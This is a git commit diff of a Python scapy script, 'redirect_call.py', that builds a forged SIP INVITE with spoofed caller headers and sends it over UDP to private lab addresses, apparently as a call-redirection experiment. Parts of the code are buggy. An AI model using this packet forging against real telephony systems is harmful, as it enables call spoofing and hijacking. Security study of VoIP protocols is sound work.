af0088fd86409c63e1d974f8ece1a6fa8ef98b8e
Shelovescolin <colin.ledru@gmail.com>
2022-06-17 18:31:30 +0200

    forging SIP packet DONE

--- redirect_call.py
+++ redirect_call.py
@@ -1,30 +1,30 @@
-import string
-from numpy import spacing
+from random import randrange
 from scapy.all import *
-import re
+from scapy.layers.inet import *
+
 
 new_sip ="1101"
 new_ip = "192.168.66.66"
 
-caller_ip = "11111111111"
+caller_ip = "192.168.77.77"
 caller_sip = "1102"
 call_id = "34ui3H5I3UOIiOP3ioH3ipH3"
 fs = 8000
 
-header_to_modify =(
-    f'INVITE sip:{new_sip}@{new_ip};user=phone;uniq=E04784589605A88765A939C2CA2A7 SIP/2.0'
-    'Max-Forwards: 59'
-    f'Via: SIP/2.0/UDP {caller_ip}:5060;branch=z9hG4bKg3Zqkv7i1tg6jule4zo2e7ndqkj1zfut6'
-    f'To: "{new_sip}" <sip:{new_sip}@telekom.de;transport=udp;user=phone>'
-    f'From: <sip:{caller_sip}@dtag-gn.de;transport=udp;user=phone>;tag=h7g4Esbg_p65557t1573829978m943109c168405915s1_3637842016-655695229'
-    f'Call-ID: {call_id}'
-    'CSeq: 1 INVITE'
-    f'Contact: <sip:sgc_c@{caller_ip};transport=udp>;+g.3gpp.icsi-ref="urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel"'
+dstIP = "192.68.1.125"
 
-    f'a=rtpmap:101 telephone-event/{fs}'
+forged_packet =(
+    f'INVITE sip:{new_sip}@{new_ip};user=phone;uniq=E04784589605A88765A939C2CA2A7 SIP/2.0\r\n'
+    'Max-Forwards: 59\r\n'
+    f'Via: SIP/2.0/UDP {caller_ip}:5060;branch=z9hG4bKg3Zqkv7i1tg6jule4zo2e7ndqkj1zfut6\r\n'
+    f'To: "{new_sip}" <sip:{new_sip}@telekom.de;transport=udp;user=phone>\r\n'
+    f'From: <sip:{caller_sip}@dtag-gn.de;transport=udp;user=phone>;tag=h7g4Esbg_p65557t1573829978m943109c168405915s1_3637842016-655695229\r\n'
+    f'Call-ID: {call_id}\r\n'
+    'CSeq: 1 INVITE\r\n'
+    f'Contact: <sip:sgc_c@{caller_ip};transport=udp>;+g.3gpp.icsi-ref="urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel"\r\n'
 
-)
-
+    f'a=rtpmap:101 telephone-event/{fs}\r\n'
+).format(dstIP)
 
 non_needed_fieds=(
 
@@ -55,3 +55,9 @@ non_needed_fieds=(
     'a=rtpmap:109 G726-16/8000'
     'a=ptime:20'
 )
+
+ip = IP(src="192.168.1.125",dst="192.168.1.125")
+
+udp = UDP(sport = randrange(80,65535),dport=6789)
+
+send(ip/udp/forged_packet)
